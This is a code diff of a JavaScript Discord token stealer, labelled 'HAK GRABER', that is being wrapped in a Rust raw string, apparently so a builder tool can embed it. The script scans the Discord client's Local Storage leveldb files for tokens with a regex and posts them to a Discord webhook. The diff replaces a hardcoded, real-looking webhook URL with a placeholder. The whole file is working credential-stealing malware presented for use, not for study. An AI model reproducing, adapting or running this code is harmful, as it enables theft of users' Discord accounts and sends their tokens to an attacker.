@@ -1,4 +1,4 @@
-const request = require('request');
+r#"const request = require('request');
 const fs = require('fs');
 const path = require('path'); 
 
@@ -7,7 +7,7 @@ function format_token(token) {
 }
 
 function make_webhook_post(to_post) {
-    request.post('https://discordapp.com/api/webhooks/726175225397510234/3o-NynTRD7FDaMfg_o_JilD6EHkDXS4_xdKfYJGePoBDGeHv_ylMD2rb-3EWDloZpb6G', {
+    request.post("WEBHOOK_URL_REPLACE", {
     json: {
         username: "HAK GRABER",
         content: format_token(to_post)
@@ -18,8 +18,8 @@ function make_webhook_post(to_post) {
 
 
 function get_token() {
-    let re = new RegExp('\"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})\"');
-    let dir_name = path.join(__dirname, '‎/../../../../Local Storage/leveldb');
+    let re = new RegExp("\"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})\"");
+    let dir_name = path.join(__dirname, "‎/../../../../Local Storage/leveldb");
     try {
         var files = fs.readdirSync(dir_name);
             for( const file of files ) {
@@ -43,4 +43,4 @@ function get_token() {
     }
 }
 
-get_token();
+get_token();"#
